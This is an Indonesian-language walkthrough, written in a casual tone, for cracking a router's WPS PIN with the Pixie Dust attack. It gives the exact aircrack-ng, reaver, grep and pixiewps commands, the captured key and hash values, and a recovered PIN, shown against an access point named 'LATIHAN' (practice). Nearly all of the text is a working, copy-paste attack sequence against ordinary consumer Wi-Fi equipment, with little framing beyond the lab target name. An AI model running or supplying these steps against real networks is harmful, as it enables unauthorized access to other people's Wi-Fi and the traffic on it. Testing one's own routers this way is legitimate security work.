# Hack Wi-Fi WPS (PixieWPS)

## Bahan-Bahan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Reaver
- PixieWPS
- Koneksi internet

## Instal Tools

```
sudo apt-get update
sudo apt-get install aircrack-ng reaver pixiewps
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WPS

```
sudo wash -i [interface]
```

Output:

```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
9C:C1:72:6B:DF:88    9  -17  2.0  No   RalinkTe  LATIHAN
```

Pastiin status `Lck` nya kaga `Yes`, kalo `Yes` itu artinya WPS target ke lock. Kalo ke lock kaga bisa diserang.

#### 3. Cari Data yang Dibutuhin PixieWPS
- Enrollee public key
- Registrar public key
- Enrollee hash-1
- Enrollee hash-2
- Authentication session key
- Enrollee nonce

Cara buat dapetin data di atas. Jalanin Reaver sekali:

```
sudo reaver -i [interface] -e [essid] -b [bssid] -c [channel] -g 1 -vvv > output_reaver.txt
```

1. Cari Enrollee public key:

   ```
   grep "WPS: DH peer Public Key" output_reaver.txt
   ```

   Output:

   ```
   WPS: DH peer Public Key - hexdump(len=192): 92 8e f5 15 e2 be 78 80 bf ed 3e fb 79 08 6b e6 f9 05 96 a3 c6 4b ab ab f1 69 8d dd 4a 10 c3 cd 08 a2 1b b3 0d c2 71 c6 fe 6a b0 01 61 7a da 2c c7 45 88 6b c0 e3 8e 8d 5b 59 08 e2 7a 91 51 ec 0c cd 74 88 34 53 cb 71 e3 c7 18 6b c6 f8 5e 54 ca e9 0b 13 d1 15 06 6e b9 93 f4 60 4f ed b2 0f b9 7c d8 ea 71 3c ca e0 14 0b d2 59 cd 0e 7a 2e 4e 19 34 08 a4 8e f6 04 33 57 2c d6 6a ce f7 99 90 5c 86 ba 99 b1 5f a9 d9 ae db 25 87 5e 88 8a ed 55 95 3c 88 6a 2f aa 08 42 1d a8 8e 34 45 22 01 61 ea 85 75 1a fd 95 4b 93 76 af fc 68 4e 47 75 4d 57 b7 f8 ec 30 01 37 dd dc 75 c5 32 39 8a
   ```

   Bersihin hex:

   ```
   echo "[hex]" | tr -d " "
   ```

   Output:

   ```
   928ef515e2be7880bfed3efb79086be6f90596a3c64bababf1698ddd4a10c3cd08a21bb30dc271c6fe6ab001617ada2cc745886bc0e38e8d5b5908e27a9151ec0ccd74883453cb71e3c7186bc6f85e54cae90b13d115066eb993f4604fedb20fb97cd8ea713ccae0140bd259cd0e7a2e4e193408a48ef60433572cd66acef799905c86ba99b15fa9d9aedb25875e888aed55953c886a2faa08421da88e3445220161ea85751afd954b9376affc684e47754d57b7f8ec300137dddc75c532398a
   ```
2. Car Registrar public key:

   ```
   grep "WPS: DH own Public Key" output_reaver.txt
   ```

   Output:

   ```
   WPS: DH own Public Key - hexdump(len=192): ca 28 6a 7e e5 0a 40 79 c1 fd 71 cf 73 27 0a 89 6d e7 a4 fd 88 cd 7c 43 fb e2 ef 87 1f 84 45 66 02 68 00 74 27 5a a6 b3 7d 56 03 d2 22 78 00 f5 cd 41 5d 3a 32 0c 3d 6a a3 df 74 a3 8e c7 16 b5 bb 29 68 d4 78 3e 09 64 92 25 08 70 62 13 7f e7 1e f7 3b de 91 ea f5 e4 62 1a fd bf 4b ff 55 9f 29 5b 6a 8b 77 3c 92 c9 df ea 5a c6 be 70 83 49 2d 45 f6 ea 17 e2 0c 89 6d 7a 23 2c 98 52 23 11 4c 66 72 86 84 1c d7 83 bd 6e 75 ad 44 81 bd 26 0b b6 60 71 a8 9b 56 c7 d8 39 fe 7c ee 80 8f 3c a1 4d e3 a1 4a 93 b8 8d 1f 5c df 23 a7 6a 9d 76 f9 2c 62 3f eb c4 3d 2e 68 d1 f8 79 6d ed bb e8
   ```

   Bersihin hex:

   ```
   echo "[hex]" | tr -d " "
   ```

   Output:

   ```
   ca286a7ee50a4079c1fd71cf73270a896de7a4fd88cd7c43fbe2ef871f84456602680074275aa6b37d5603d2227800f5cd415d3a320c3d6aa3df74a38ec716b5bb2968d4783e09649225087062137fe71ef73bde91eaf5e4621afdbf4bff559f295b6a8b773c92c9dfea5ac6be7083492d45f6ea17e20c896d7a232c985223114c667286841cd783bd6e75ad4481bd260bb66071a89b56c7d839fe7cee808f3ca14de3a14a93b88d1f5cdf23a76a9d76f92c623febc43d2e68d1f8796dedbbe8
   ```
3. Cari Enrollee hash-1:

   ```
   grep "WPS: E-Hash1" output_reaver.txt
   ```

   Output:

   ```
   WPS: E-Hash1 - hexdump(len=32): 18 bd 4e 58 56 e0 58 61 3b ec d0 e8 8f 85 2e f7 89 99 32 5b 60 b3 64 19 77 ba 03 bc 1f bc 30 27
   ```

   Bersihin hex:

   ```
   echo "[hex]" | tr -d " "
   ```

   Output:

   ```
   18bd4e5856e058613becd0e88f852ef78999325b60b3641977ba03bc1fbc3027
   ```
4. Enrollee hash-2:

   ```
   grep "WPS: E-Hash2" output_reaver.txt
   ```

   Output:

   ```
   WPS: E-Hash2 - hexdump(len=32): 5b 24 f4 7a 49 1b c8 d7 5d 78 52 8e d8 4e 48 ca 71 13 dd 7f 3f e3 db 84 02 9f c7 5f 1d a5 6a e3
   ```

   Bersihin hex:

   ```
   echo "[hex]" | tr -d " "
   ```

   Output:

   ```
   5b24f47a491bc8d75d78528ed84e48ca7113dd7f3fe3db84029fc75f1da56ae3
   ```
5. Cari Authentication session key:

   ```
   grep "WPS: AuthKey" output_reaver.txt
   ```

   Output:

   ```
   WPS: AuthKey - hexdump(len=32): 5a 0c b6 f1 26 48 87 cb 2a d0 47 9a 83 3e 6e 5b 7b b4 af c3 a2 e9 ed f5 c6 f8 15 78 ec 96 f7 4a
   ```

   Bersihin hex:

   ```
   echo "[hex]" | tr -d " "
   ```

   Output:

   ```
   5a0cb6f1264887cb2ad0479a833e6e5b7bb4afc3a2e9edf5c6f81578ec96f74a
   ```
6. Cari Enrollee nonce:

   ```
   grep "WPS: Enrollee Nonce" output_reaver.txt
   ```

   Output:

   ```
   WPS: Enrollee Nonce - hexdump(len=16): 25 2d 73 11 9b 81 68 19 c4 a2 c9 7b 72 da 18 57
   ```

   Bersihin hex:

   ```
   echo "[hex]" | tr -d " "
   ```

   Output:

   ```
   252d73119b816819c4a2c97b72da1857
   ```

#### 4. Simpen Data yang Dibutuhin PixieWPS
- Enrollee public key: `928ef515e2be7880bfed3efb79086be6f90596a3c64bababf1698ddd4a10c3cd08a21bb30dc271c6fe6ab001617ada2cc745886bc0e38e8d5b5908e27a9151ec0ccd74883453cb71e3c7186bc6f85e54cae90b13d115066eb993f4604fedb20fb97cd8ea713ccae0140bd259cd0e7a2e4e193408a48ef60433572cd66acef799905c86ba99b15fa9d9aedb25875e888aed55953c886a2faa08421da88e3445220161ea85751afd954b9376affc684e47754d57b7f8ec300137dddc75c532398a`
- Registrar public key: `ca286a7ee50a4079c1fd71cf73270a896de7a4fd88cd7c43fbe2ef871f84456602680074275aa6b37d5603d2227800f5cd415d3a320c3d6aa3df74a38ec716b5bb2968d4783e09649225087062137fe71ef73bde91eaf5e4621afdbf4bff559f295b6a8b773c92c9dfea5ac6be7083492d45f6ea17e20c896d7a232c985223114c667286841cd783bd6e75ad4481bd260bb66071a89b56c7d839fe7cee808f3ca14de3a14a93b88d1f5cdf23a76a9d76f92c623febc43d2e68d1f8796dedbbe8`
- Enrollee hash-1: `18bd4e5856e058613becd0e88f852ef78999325b60b3641977ba03bc1fbc3027`
- Enrollee hash-2: `5b24f47a491bc8d75d78528ed84e48ca7113dd7f3fe3db84029fc75f1da56ae3`
- Authentication session key: `5a0cb6f1264887cb2ad0479a833e6e5b7bb4afc3a2e9edf5c6f81578ec96f74a`
- Enrollee nonce: `252d73119b816819c4a2c97b72da1857`

#### 5. Jalanin Serangan PixieDust Attack

```
pixiewps -e [pke] -r [pkr] -s [e-hash1] -z [e-hash2] -a [authkey] -n [e-nonce]
```

Keterangan:
- `-e`: Enrollee public key
- `-r`: Registrar public key
- `-s`: Enrollee hash-1
- `-z`: Enrollee hash-2
- `-a`: Authentication session key
- `-n`: Enrollee nonce
  
Output:

```
Pixiewps 1.4

[?] Mode:     1 (RT/MT/CL)
[*] Seed N1:  0x052f6c3c
[*] Seed ES1: 0x00000000
[*] Seed ES2: 0x00000000
[*] PSK1:     6b88da3e0525a7a33f4383964c2df28b
[*] PSK2:     441487a99314006e9dff61ac2e951e1b
[*] ES1:      00000000000000000000000000000000
[*] ES2:      00000000000000000000000000000000
[+] WPS pin:  56468373

[*] Time taken: 0 s 70 ms
```

PIN WPS: `56468373`
